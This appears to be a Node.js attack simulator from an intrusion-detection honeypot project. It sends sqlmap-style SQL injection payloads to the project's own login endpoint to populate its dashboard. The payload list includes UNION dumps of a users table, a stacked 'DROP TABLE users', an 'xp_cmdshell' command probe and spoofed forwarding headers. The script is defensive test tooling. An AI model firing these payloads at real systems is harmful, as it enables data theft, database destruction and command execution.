#!/usr/bin/env node
/**
 * PhantomIDS — SQLi Attack Simulator
 *
 * Fires realistic sqlmap-style payloads at the honeypot to populate
 * the dashboard with live attack data.
 *
 * Usage:
 *   npm run simulate                        # targets localhost:5000
 *   npm run simulate 192.168.1.30 5000      # targets ESP32
 *   npm run simulate:esp32                  # also simulates ESP32 alerts
 */

'use strict';

const http = require('http');

const TARGET_HOST    = process.argv[2] && !process.argv[2].startsWith('--') ? process.argv[2] : 'localhost';
const TARGET_PORT    = parseInt(process.argv[3]) || 5000;
const SIMULATE_ESP32 = process.argv.includes('--esp32');

const PAYLOADS = [
  { username: "admin' AND 1=1--",                                    password: 'x',           label: 'Boolean TRUE'       },
  { username: "admin' AND 1=2--",                                    password: 'x',           label: 'Boolean FALSE'      },
  { username: "' UNION SELECT NULL--",                               password: 'x',           label: 'UNION NULL probe'   },
  { username: "' UNION SELECT 1,2,3--",                              password: 'x',           label: 'UNION col count'    },
  { username: "' UNION SELECT username,password,role FROM users--",  password: 'x',           label: 'UNION dump'         },
  { username: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", password: 'x',       label: 'Error-based'        },
  { username: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",   password: 'x',       label: 'CASE WHEN'          },
  { username: "' AND SLEEP(1)--",                                    password: 'x',           label: 'SLEEP probe'        },
  { username: "'; DROP TABLE users--",                               password: 'x',           label: 'Stacked DROP'       },
  { username: "' OR '1'='1",                                         password: "' OR '1'='1", label: 'OR bypass'          },
  { username: "' OR 1=1--",                                          password: 'x',           label: 'OR 1=1'             },
  { username: "admin'--",                                            password: 'anything',    label: 'Comment bypass'     },
  { username: "' OR CHR(49)=CHR(49)--",                              password: 'x',           label: 'CHR() evasion'      },
  { username: "'; EXEC xp_cmdshell('whoami')--",                     password: 'x',           label: 'xp_cmdshell'        },
  { username: "' AND @@version--",                                   password: 'x',           label: 'Version fingerprint'},
  { username: 'admin',                                               password: 'wrongpass',   label: 'Normal (clean)'     },
  { username: 'john.doe',                                            password: 'password1',   label: 'Normal (success)'   },
];

const ATTACKER_IPS = ['192.168.1.7', '10.0.0.42', '172.16.0.99', '192.168.1.105'];

function post(urlPath, body, spoofIp) {
  return new Promise((resolve) => {
    const bodyStr = JSON.stringify(body);
    const req = http.request({
      hostname: TARGET_HOST,
      port:     TARGET_PORT,
      path:     urlPath,
      method:   'POST',
      headers: {
        'Content-Type':    'application/json',
        'Content-Length':  Buffer.byteLength(bodyStr),
        'User-Agent':      'sqlmap/1.9.11#stable',
        'X-Forwarded-For': spoofIp || ATTACKER_IPS[0],
      },
    }, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', (e) => resolve({ status: 0, error: e.message }));
    req.write(bodyStr);
    req.end();
  });
}

const delay = ms => new Promise(r => setTimeout(r, ms));

async function run() {
  console.log(`\nPhantomIDS Attack Simulator`);
  console.log(`Target  : http://${TARGET_HOST}:${TARGET_PORT}/login`);
  console.log(`Payloads: ${PAYLOADS.length} vectors  ESP32: ${SIMULATE_ESP32 ? 'YES' : 'NO'}\n`);

  // Verify server is reachable
  try {
    await new Promise((resolve, reject) => {
      const req = http.request({ hostname: TARGET_HOST, port: TARGET_PORT, path: '/honeypot-status', method: 'GET' }, resolve);
      req.on('error', reject);
      req.end();
    });
  } catch {
    console.error(`Cannot reach ${TARGET_HOST}:${TARGET_PORT} — is the server running?`);
    process.exit(1);
  }

  let sent = 0, errors = 0;

  for (let round = 0; round < 3; round++) {
    console.log(`── Round ${round + 1}/3 ─────────────────────────`);

    for (const payload of PAYLOADS) {
      const ip     = ATTACKER_IPS[Math.floor(Math.random() * ATTACKER_IPS.length)];
      const result = await post('/login', { username: payload.username, password: payload.password }, ip);

      console.log(`  ${result.status === 200 ? '✓' : '✗'} [${ip}] ${payload.label.padEnd(22)} → HTTP ${result.status || result.error}`);
      result.status === 0 ? errors++ : sent++;

      if (SIMULATE_ESP32 && !payload.label.startsWith('Normal')) {
        await post('/api/esp32/alert', {
          attacker_ip: ip,
          payload:     payload.username,
          score:       payload.username.includes("'") ? 2 : 1,
        }, ip);
      }

      await delay(120 + Math.random() * 180);
    }
  }

  console.log(`\nDone — sent: ${sent}  errors: ${errors}`);
  console.log(`Dashboard: http://${TARGET_HOST}:${TARGET_PORT}/dashboard\n`);
}

run().catch(console.error);
